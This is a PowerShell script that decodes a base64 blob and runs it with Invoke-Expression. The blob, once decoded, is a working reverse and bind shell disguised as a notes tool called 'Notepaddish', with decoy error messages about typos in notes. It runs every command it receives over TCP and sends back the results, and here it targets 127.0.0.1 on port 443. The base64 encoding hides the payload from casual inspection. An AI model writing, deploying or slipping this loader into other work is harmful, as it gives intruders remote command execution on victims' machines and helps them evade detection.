# Base64 encoded script
$Base64 = "ZnVuY3Rpb24gTm90ZXBhZGRpc2gNCnsgDQoNCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZT0icmV2ZXJzZSIpXSBQYXJhbSgNCg0KICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUsIFBhcmFtZXRlclNldE5hbWU9InJldmVyc2UiKV0NCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRm
YWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0iYmluZCIpXQ0KICAgICAgICBbU3RyaW5nXQ0KICAgICAgICAkSVBBZGRyZXNzLA0KDQogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZT0icmV2ZXJzZSIpXQ0KICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUsIFBhcmFtZXRlclNldE5h
bWU9ImJpbmQiKV0NCiAgICAgICAgW0ludF0NCiAgICAgICAgJFBvcnQsDQoNCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lPSJyZXZlcnNlIildDQogICAgICAgIFtTd2l0Y2hdDQogICAgICAgICRSZXZlcnNlLA0KDQogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZT0iYmluZCIpXQ0KICAgICAgICBbU3dpdGNoXQ0KICAgICAgICAkQmluZA0KDQogICAgKQ0K
ICAgIA0KICAgIHRyeSANCiAgICB7DQogICAgICAgIGlmICgkUmV2ZXJzZSkNCiAgICAgICAgew0KICAgICAgICAgICAgJHRjcENsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgkSVBBZGRyZXNzLCRQb3J0KQ0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKCRCaW5kKQ0KICAgICAgICB7DQogICAgICAgICAgICAkdGNwTGlzdGVuZXIgPSBbU3lzdGVtLk5l
dC5Tb2NrZXRzLlRjcExpc3RlbmVyXSRQb3J0DQogICAgICAgICAgICAkdGNwTGlzdGVuZXIuc3RhcnQoKSAgICANCiAgICAgICAgICAgICR0Y3BDbGllbnQgPSAkdGNwTGlzdGVuZXIuQWNjZXB0VGNwQ2xpZW50KCkNCiAgICAgICAgfSANCg0KICAgICAgICAkbmV0d29ya1N0cmVhbSA9ICR0Y3BDbGllbnQuR2V0U3RyZWFtKCkNCiAgICAgICAgW2J5dGVbXV0kYnVmZmVyID0gMC4uNjU1MzV8
JXswfQ0KDQogICAgICAgICRpbnRyb0J5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCJXaW5kb3dzIFBvd2VyU2hlbGwgcnVubmluZyBhcyB1c2VyICIgKyAkZW52OnVzZXJuYW1lICsgIiBvbiAiICsgJGVudjpjb21wdXRlcm5hbWUgKyAiYG5Db3B5cmlnaHQgKEMpIDIwMTUgTWljcm9zb2Z0IENvcnBvcmF0aW9uLiBBbGwgcmlnaHRzIHJlc2VydmVkLmBuYG4iKQ0K
ICAgICAgICAkbmV0d29ya1N0cmVhbS5Xcml0ZSgkaW50cm9CeXRlcywwLCRpbnRyb0J5dGVzLkxlbmd0aCkNCiAgICAgICAgJHByb21wdEJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCdQUyAnICsgKEdldC1Mb2NhdGlvbikuUGF0aCArICc+JykgDQogICAgICAgICRuZXR3b3JrU3RyZWFtLldyaXRlKCRwcm9tcHRCeXRlcywwLCRwcm9tcHRCeXRlcy5MZW5ndGgp
DQogICAgICAgIHdoaWxlKCgkcmVhZEJ5dGVzID0gJG5ldHdvcmtTdHJlYW0uUmVhZCgkYnVmZmVyLCAwLCAkYnVmZmVyLkxlbmd0aCkpIC1uZSAwKQ0KICAgICAgICB7DQogICAgICAgICAgICAkdGV4dERlY29kZXIgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nDQogICAgICAgICAgICAkaW5wdXREYXRhID0gJHRleHREZWNvZGVyLkdldFN0cmluZygk
YnVmZmVyLDAsICRyZWFkQnl0ZXMpDQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAkY29tbWFuZFJlc3VsdCA9IChJbnZva2UtRXhwcmVzc2lvbiAtQ29tbWFuZCAkaW5wdXREYXRhIDI+JjEgfCBPdXQtU3RyaW5nICkNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgV3JpdGUtV2Fy
bmluZyAiVHlwbyBpbiBub3RlcywgcGxlYXNlIGNoZWNrIHlvdXIgc3BlbGxpbmcgaW4gdGhlIGFwcGxpY2F0aW9uLiIgDQogICAgICAgICAgICAgICAgV3JpdGUtRXJyb3IgJF8NCg0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJHJlc3BvbnNlID0gJGNvbW1hbmRSZXN1bHQgKyAnUFMgJyArIChHZXQtTG9jYXRpb24pLlBhdGggKyAnPiAnDQogICAgICAgICAgICAkZXJyb3JEZXRhaWxz
ID0gKCRlcnJvclswXSB8IE91dC1TdHJpbmcpDQogICAgICAgICAgICAkZXJyb3IuY2xlYXIoKQ0KICAgICAgICAgICAgJHJlc3BvbnNlID0gJHJlc3BvbnNlICsgJGVycm9yRGV0YWlscw0KDQogICAgICAgICAgICAjUmV0dXJuIHRoZSByZXN1bHRzDQogICAgICAgICAgICAkcmVzcG9uc2VCeXRlcyA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkcmVzcG9uc2UpDQogICAg
ICAgICAgICAkbmV0d29ya1N0cmVhbS5Xcml0ZSgkcmVzcG9uc2VCeXRlcywwLCRyZXNwb25zZUJ5dGVzLkxlbmd0aCkNCiAgICAgICAgICAgICRuZXR3b3JrU3RyZWFtLkZsdXNoKCkgIA0KICAgICAgICB9DQogICAgICAgICR0Y3BDbGllbnQuQ2xvc2UoKQ0KICAgICAgICBpZiAoJHRjcExpc3RlbmVyKQ0KICAgICAgICB7DQogICAgICAgICAgICAkdGNwTGlzdGVuZXIuU3RvcCgpDQogICAg
ICAgIH0NCiAgICB9DQogICAgY2F0Y2gNCiAgICB7DQogICAgICAgIFdyaXRlLVdhcm5pbmcgIk5vdGVwYWRkaXNoIHdhcyBub3QgYWJsZSB0byBjb25uZWN0LCBjaGVjayBJUCBhbmQgUG9ydCBhbmQgdHJ5IGFnYWluLiIgDQogICAgICAgIFdyaXRlLUVycm9yICRfDQogICAgfQ0KfSANCg0KTm90ZXBhZGRpc2ggLVJldmVyc2UgLUlQQWRkcmVzcyAxMjcuMC4wLjEgLVBvcnQgNDQzDQo="


# Chk if string is empty
if ([string]::IsNullOrEmpty($Base64)) {
    Write-Error "Base64 string is empty!"
    return
    }

# code str > 0x
$DecodedBytes = [System.Convert]::FromBase64String($Base64)

# conv 0x to str
$decodedScript = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Base64))

# cute the decoded
Invoke-Expression $decodedScript
